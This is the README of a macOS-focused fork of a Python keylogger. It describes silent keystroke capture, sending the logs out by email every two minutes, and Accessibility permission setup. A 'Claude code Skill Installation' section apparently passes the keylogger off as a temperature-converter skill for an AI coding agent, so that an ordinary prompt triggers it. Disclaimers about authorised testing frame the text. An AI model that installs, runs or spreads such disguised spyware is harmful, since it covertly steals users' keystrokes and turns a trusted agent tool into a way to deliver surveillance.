> **⚠️ WARNING: This tool is for educational and authorized security testing purposes ONLY. Unauthorized use of keyloggers is illegal and unethical. Use responsibly and only on systems you own or have explicit permission to test.**

## Features
- 📧 **Email Reporting**: Automatically sends captured keystrokes via email
- 🔇 **Silent Operation**: Runs completely in the background with no console output
- 🍎 **macOS Optimized**: Uses Mail.app for email delivery (no SMTP authentication needed)
- ⚙️ **Easy Setup**: Simple bash scripts for quick deployment

## Requirements

- Python 3.6+
- macOS Mail.app (for macOS email delivery)
- Internet connection (for email delivery)

## Claude code Skill Installation
1. In your system's ```.claude/skills``` add the temparature-converter direcotry
2. Open Claude code
3. Prompt ```Convert 100°F to Celsius```

### macOS Setup

**Important**: macOS requires Accessibility permissions for the keylogger to work.

1. **Manual Permission Setup**:
   - Go to **System Preferences** > **Security & Privacy** > **Privacy** > **Accessibility**
   - Click the lock icon and enter your password
   - Add **Terminal** to the list
   - Check the box next to it

2. **Mail.app Configuration**:
   - Ensure Mail.app is configured with your email account
   - The keylogger will use Mail.app to send emails automatically

## Project Structure

```
Tanit-Keylogger/
├── keylogger.py          # Main keylogger class
├── main.py               # Entry point
├── requirements.txt      # Python dependencies
├── LICENSE               # License file
└── README.md            # This file
```

## How It Works

1. **Key Capture**: Uses `pynput` library to capture all keyboard input
2. **Logging**: Stores keystrokes in memory
3. **Email Delivery**: 
   - **macOS**: Uses Mail.app via AppleScript (no SMTP needed)
   - **Windows/Linux**: Uses SMTP (requires email credentials)
4. **Scheduling**: Sends emails at configured intervals (default: 120 seconds)

## macOS Email Delivery

The macOS version uses Mail.app for email delivery, which:
- ✅ No SMTP authentication required
- ✅ Uses system Mail.app credentials
- ✅ Silent operation (no sounds)
- ✅ Works with any Mail.app configured account


## Security & Ethics

⚠️ **IMPORTANT DISCLAIMERS**:

- This tool is for **educational purposes** and **authorized security testing** ONLY
- **NEVER** use this tool on systems you don't own or don't have explicit permission to test
- Unauthorized use of keyloggers is **illegal** in most jurisdictions
- Always obtain written consent before testing on any system
- Use responsibly and ethically

## Legal Notice

The authors and contributors of this project are not responsible for any misuse of this software. Users are solely responsible for ensuring their use complies with applicable laws and regulations.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

See [LICENSE](LICENSE) file for details.

## Credits

- Original project: [HusseinBakri/Tanit-Keylogger](https://github.com/HusseinBakri/Tanit-Keylogger)
- Enhanced with macOS Mail.app integration and silent operation features

## Support

For issues, questions, or contributions, please open an issue on GitHub.

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.
